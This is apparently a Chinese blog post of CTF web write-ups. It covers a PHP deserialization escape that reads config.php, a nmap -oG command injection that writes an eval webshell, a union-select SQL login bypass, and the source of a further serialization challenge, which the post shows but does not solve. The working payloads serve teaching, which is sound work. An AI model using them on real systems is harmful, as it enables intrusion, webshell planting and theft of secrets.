<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Login First'</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	<span class="keyword">if</span>($profile  == <span class="keyword">null</span>) &#123;</span><br><span class="line">		header(<span class="string">'Location: update.php'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">		$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>update.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'class.php'</span>);</span><br><span class="line">	<span class="keyword">if</span>($_SESSION[<span class="string">'username'</span>] == <span class="keyword">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Login First'</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>($_POST[<span class="string">'phone'</span>] &amp;&amp; $_POST[<span class="string">'email'</span>] &amp;&amp; $_POST[<span class="string">'nickname'</span>] &amp;&amp; $_FILES[<span class="string">'photo'</span>]) &#123;</span><br><span class="line"></span><br><span class="line">		$username = $_SESSION[<span class="string">'username'</span>];</span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^\d&#123;11&#125;$/'</span>, $_POST[<span class="string">'phone'</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid phone'</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!preg_match(<span class="string">'/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/'</span>, $_POST[<span class="string">'email'</span>]))</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid email'</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br><span class="line"></span><br><span class="line">		$file = $_FILES[<span class="string">'photo'</span>];</span><br><span class="line">		<span class="keyword">if</span>($file[<span class="string">'size'</span>] &lt; <span class="number">5</span> <span class="keyword">or</span> $file[<span class="string">'size'</span>] &gt; <span class="number">1000000</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Photo size error'</span>);</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($file[<span class="string">'tmp_name'</span>], <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]));</span><br><span class="line">		$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">		$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">		$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">		$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($file[<span class="string">'name'</span>]);</span><br><span class="line"></span><br><span class="line">		$user-&gt;update_profile($username, serialize($profile));</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'Update Profile Success!&lt;a href="profile.php"&gt;Your Profile&lt;/a&gt;'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">'config.php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $table = <span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">		$key_list = <span class="keyword">Array</span>(<span class="string">'username'</span>, <span class="string">'password'</span>);</span><br><span class="line">		$value_list = <span class="keyword">Array</span>($username, md5($password));</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::insert(<span class="keyword">$this</span>-&gt;table, $key_list, $value_list);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$password = <span class="keyword">parent</span>::filter($password);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">if</span> ($object &amp;&amp; $object-&gt;password === md5($password)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">		<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">		$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">		$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">		$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> $link = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">($config)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;link = mysql_connect(</span><br><span class="line">			$config[<span class="string">'hostname'</span>],</span><br><span class="line">			$config[<span class="string">'username'</span>], </span><br><span class="line">			$config[<span class="string">'password'</span>]</span><br><span class="line">		);</span><br><span class="line">		mysql_select_db($config[<span class="string">'database'</span>]);</span><br><span class="line">		mysql_query(<span class="string">"SET sql_mode='strict_all_tables'"</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">($table, $where, $ret = <span class="string">'*'</span>)</span> </span>&#123;</span><br><span class="line">		$sql = <span class="string">"SELECT $ret FROM $table WHERE $where"</span>;</span><br><span class="line">		$result = mysql_query($sql, <span class="keyword">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> mysql_fetch_object($result);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">($table, $key_list, $value_list)</span> </span>&#123;</span><br><span class="line">		$key = implode(<span class="string">','</span>, $key_list);</span><br><span class="line">		$value = <span class="string">'\''</span> . implode(<span class="string">'\',\''</span>, $value_list) . <span class="string">'\''</span>; </span><br><span class="line">		$sql = <span class="string">"INSERT INTO $table ($key) VALUES ($value)"</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">($table, $key, $value, $where)</span> </span>&#123;</span><br><span class="line">		$sql = <span class="string">"UPDATE $table SET $key = '$value' WHERE $where"</span>;</span><br><span class="line">		<span class="keyword">return</span> mysql_query($sql);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">		<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">__class__</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$user = <span class="keyword">new</span> user();</span><br><span class="line">$user-&gt;connect($config);</span><br></pre></td></tr></table></figure>

<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">	$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">	$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">	$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">	$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们要的flag应该就在config里面，我们要想办法读取config.php文件</p>
<p>重要部分的代码就差不多是这些，在注册页面注册登录后跳转到了update.php页面，这里可以上传文件<br>源码有点多，我们可以先使用seay源代码什么工具来测试一下<br><img src="/2020/04/04/BUU-web%E4%BA%8C/6.png" alt></p>
<p>在profile.php中有个可以读取文件的地方</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[<span class="string">'phone'</span>];</span><br><span class="line">		$email = $profile[<span class="string">'email'</span>];</span><br><span class="line">		$nickname = $profile[<span class="string">'nickname'</span>];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[<span class="string">'photo'</span>]));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果$profile[‘photo’]为config.php我们应该就能读取到config.php了<br>跟进$profile</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line"><span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;show_profile(<span class="variable">$username</span>);</span><br></pre></td></tr></table></figure>

<p>跟进show_profile函数</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span><span class="params">($username)</span> </span>&#123;</span><br><span class="line">	$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line"></span><br><span class="line">	$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">	$object = <span class="keyword">parent</span>::select(<span class="keyword">$this</span>-&gt;table, $where);</span><br><span class="line">	<span class="keyword">return</span> $object-&gt;profile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有什么发现，然后看一下update.php里面参数传入后怎么处理的，发现nickname的过滤可以使用数组绕过</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>])|| strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>

<p>这里我们可以构造任意nickname的值，然后在class.php中发现了update_profile函数中又把username，new_profile用filter过滤了一遍</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">	$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">	$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">	$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后我们看一下filter是怎么过滤的</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">		$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">		$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">		$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">		$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">		$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">	<span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>这里发现$safe中的除了<code>where</code>是5个字符，其余全是六个字符。如果直接将where替换为hacker就会造成漏洞<br>测试代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    $escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">    $escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;  <span class="comment">//   /'|\\/</span></span><br><span class="line">    $string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">    $safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">    $safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br><span class="line">$profile[<span class="string">'phone'</span>] = $_POST[<span class="string">'phone'</span>];</span><br><span class="line">$profile[<span class="string">'email'</span>] = $_POST[<span class="string">'email'</span>];</span><br><span class="line">$profile[<span class="string">'nickname'</span>] = $_POST[<span class="string">'nickname'</span>];</span><br><span class="line">$profile[<span class="string">'photo'</span>] = <span class="string">'upload/'</span> . md5($_POST[<span class="string">'name'</span>]);</span><br><span class="line"><span class="keyword">echo</span> filter(serialize($profile));</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/BUU-web%E4%BA%8C/7.png" alt>实际上hacker是6个字符，而这里只显示了5个字符，就会造成如下情况<br><code>a:1{i:0;s:5:”where”;}</code>—&gt;<code>a:1{i:0;s:5:”hacher”;}</code>就会导致r没有被读到，导致反序列化出错，最终逃逸字符</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#测试代码</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;s:5:"phone";s:11:"12345678901";&#125;xxxxxxxxx'</span>));</span><br><span class="line">var_dump(unserialize(<span class="string">'a:1:&#123;s:5:"phone";s:11:"12345678901";&#125;'</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/BUU-web%E4%BA%8C/8.png" alt><br>可以看到之后的字符串对于反序列化一个完整的序列化字符串是无效的<br>还是使用第一个测试代码<br>提交<code>nickname[]=666&quot;;}s:5:&quot;photo&quot;;s:10:config.php</code><br><img src="/2020/04/04/BUU-web%E4%BA%8C/9.png" alt></p>
<blockquote>
<p>a:4:{s:5:”phone”;s:11:”12345645645”;s:5:”email”;s:10:”<a href="mailto:asd@qq.com" target="_blank" rel="noopener">asd@qq.com</a>“;s:8:”nickname”;a:1:{i:0;s:33:”666”;}s:5:”photo”;s:10:config.php”;}s:5:”photo”;s:39:”upload/584da0a485f209242059e6de66aac904”;}</p>
</blockquote>
<p>如果我们将33修改为3导致”闭合”,使<code>s:5:&quot;photo&quot;;s:10:config.php&quot;</code>逃逸出来，而后面的<code>s:5:&quot;photo&quot;;s:39:&quot;upload/6512bd43d9caa6e02c990b0a82652dca&quot;;}</code>则失去了作用，最终取出的是config.php中的内容。也就是我们直接将photo的的传参通过nickname那一栏直接传入，上传photo的那一栏不再起作用<br>第二个例子可以看到，一个where被替换成hacker后，多出了一个r，如果我们传入31个where就挤出来31个字符，刚好到”}前面使得其闭合。<br>payload</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span>";&#125;<span class="selector-tag">s</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"photo"</span>;<span class="selector-tag">s</span><span class="selector-pseudo">:10</span><span class="selector-pseudo">:"config.php</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/04/BUU-web%E4%BA%8C/10.png" alt><br>一共186个字符，刚好等于31个hacker字符的数量<br>接下来抓包传参，访问profile.php查看源码解base64就可以看到flag了。注意nickname要改为nickname[]<br><img src="/2020/04/04/BUU-web%E4%BA%8C/11.png" alt><br>参考文章：<a href="https://lihuaiqiu.github.io/2019/06/07/2016-0CTF-piapiapia-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6/" target="_blank" rel="noopener">https://lihuaiqiu.github.io/2019/06/07/2016-0CTF-piapiapia-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8%E5%AD%97%E7%AC%A6/</a></p>
<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><p>进入题目出现源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'host'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">'host'</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">        <span class="comment">//escapeshellarg</span></span><br><span class="line">    <span class="comment">//1,确保用户值传递一个参数给命令</span></span><br><span class="line">    <span class="comment">//2,用户不能指定更多的参数</span></span><br><span class="line">    <span class="comment">//3,用户不能执行不同的命令</span></span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">        <span class="comment">//escapeshellcmd</span></span><br><span class="line">    <span class="comment">//1,确保用户只执行一个命令</span></span><br><span class="line">    <span class="comment">//2,用户可以指定不限数量的参数</span></span><br><span class="line">    <span class="comment">//3,用户不能执行不同的命令</span></span><br><span class="line">    $sandbox = md5(<span class="string">"glzjin"</span>. $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'you are in sandbox '</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们传入host，经过<code>escapeshellarg()和escapeshellcmd()</code>函数处理。百度后发现这两个函数在一起使用会出现问题<a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">PHP escapeshellarg()+escapeshellcmd() 之殇</a></p>
<blockquote>
<figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>传入的参数是：<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>' -v -d a=<span class="number">1</span></span><br><span class="line"><span class="number">2.</span>经过escapeshellarg处理后变成了<span class="string">'172.17.0.2'</span>\<span class="string">''</span> -v -d a=<span class="number">1</span>'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"><span class="number">3.</span>经过escapeshellcmd处理后变成<span class="string">'172.17.0.2'</span>\\<span class="string">''</span> -v -d a=<span class="number">1</span>\<span class="string">'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：http://php.net/manual/zh/function.escapeshellcmd.php</span></span><br><span class="line"><span class="string">4.最后执行的命令是curl '</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\<span class="string">''</span> -v -d a=<span class="number">1</span>\<span class="string">'，由于中间的\\被解释为\而不再是转义字符，所以后面的'</span>没有被转义，与再后面的<span class="string">'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'</span>，即向<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\发起请求，POST 数据为a=<span class="number">1</span>'。</span><br></pre></td></tr></table></figure>
</blockquote>
<p>由于其他操作符都被注释了，所以我们可以考虑利用nmap，发现参数-oG可以实现将命令和结果写到文件，然后我么可以写入一句话木马：</p>
<blockquote>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">?host=' <span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"hack"</span>]);<span class="meta">?&gt;</span></span> -oG hack.php '</span><br></pre></td></tr></table></figure>
</blockquote>
<p>之后会返回文件夹名,访问执行命令可得到flag<br><img src="/2020/04/04/BUU-web%E4%BA%8C/25.png" alt></p>
<p><img src="/2020/04/04/BUU-web%E4%BA%8C/24.png" alt></p>
<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>一个登陆框，抓包后发现一个base32加密，解密后为base64.再次解密得到</p>
<blockquote>
<p>select * from user where username = ‘$name’</p>
</blockquote>
<p>可以判断注入点在name<br>然后测试</p>
<blockquote>
<p>admin’            报错</p>
<p>admin”            提示密码错误</p>
<p>admin‘–+        提示密码错误</p>
</blockquote>
<p>所以可以判断为单引号闭合注入<br>fuzz一下发现过滤了=和一些关键字<br><img src="/2020/04/04/BUU-web%E4%BA%8C/12.png" alt><br>过滤了<code>order by</code>我们使用<code>union select</code> 查字段，发现有三个字段<br><img src="/2020/04/04/BUU-web%E4%BA%8C/13.png" alt><br>但是过滤了小括号，没办法绕过<br>看了wp后发现<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据</strong><br>所以我们可以构造payload</p>
<blockquote>
<p>name=1’ union select 0,’admin’,’81dc9bdb52d04dc20036dbd8313ed055’–+&amp;pw=1234</p>
</blockquote>
<p>其中<code>81dc9bdb52d04dc20036dbd8313ed055</code>为1234的md5值<br><img src="/2020/04/04/BUU-web%E4%BA%8C/14.png" alt></p>
<h1 id="安洵杯-easy-serialize-php"><a href="#安洵杯-easy-serialize-php" class="headerlink" title="[安洵杯]easy_serialize_php"></a>[安洵杯]easy_serialize_php</h1><p>进入题目发现源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">'f'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($img)</span></span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">'php'</span>,<span class="string">'flag'</span>,<span class="string">'php5'</span>,<span class="string">'php4'</span>,<span class="string">'fl1g'</span>);</span><br><span class="line">    $filter = <span class="string">'/'</span>.implode(<span class="string">'|'</span>,$filter_arr).<span class="string">'/i'</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">''</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"user"</span>] = <span class="string">'guest'</span>;</span><br><span class="line">$_SESSION[<span class="string">'function'</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;a href="index.php?f=highlight_file"&gt;source_code&lt;/a&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">'img_path'</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = base64_encode(<span class="string">'guest_img.png'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">'img'</span>] = sha1(base64_encode($_GET[<span class="string">'img_path'</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">'highlight_file'</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">'index.php'</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'phpinfo'</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'phpinfo();'</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">'show_image'</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">'img'</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

